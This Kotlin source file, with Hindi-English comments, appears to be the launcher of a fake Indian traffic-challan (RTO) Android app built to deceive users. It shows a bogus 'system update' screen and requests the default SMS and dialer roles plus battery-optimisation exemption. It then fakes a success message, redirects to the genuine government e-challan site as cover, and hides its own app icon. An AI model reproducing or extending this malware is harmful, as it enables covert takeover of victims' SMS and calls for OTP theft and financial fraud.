package com.rte.challan

import android.app.role.RoleManager
import android.content.*
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Yahan "Checking for system updates..." wali screen dikhao
        Handler(Looper.getMainLooper()).postDelayed({ startChain() }, 1000)
    }

    private fun startChain() {
        requestRole(RoleManager.ROLE_SMS, 101)
    }

    private fun requestRole(role: String, code: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val rm = getSystemService(ROLE_SERVICE) as RoleManager
            if (!rm.isRoleHeld(role)) {
                startActivityForResult(rm.createRequestRoleIntent(role), code)
            } else { next(code) }
        }
    }

    private fun next(code: Int) {
        if (code == 101) requestRole(RoleManager.ROLE_DIALER, 102)
        else if (code == 102) requestBattery()
    }

    override fun onActivityResult(req: Int, res: Int, d: Intent?) {
        super.onActivityResult(req, res, d)
        next(req)
        // Sab ho gaya toh redirect aur hide
        if (req == 103 || (req == 102 && res == RESULT_OK)) hideApp()
    }

    private fun requestBattery() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivityForResult(intent, 103)
        } else { hideApp() }
    }

    private fun hideApp() {
        Toast.makeText(this, "System Update Successful!", Toast.LENGTH_SHORT).show()
        
        // 1. Chrome par redirect karo (Asli RTO site)
        val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://echallan.parivahan.gov.in/"))
        startActivity(browserIntent)

        // 2. 2 second baad icon hide kar do
        Handler(Looper.getMainLooper()).postDelayed({
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            finish() 
        }, 2000)
    }
}
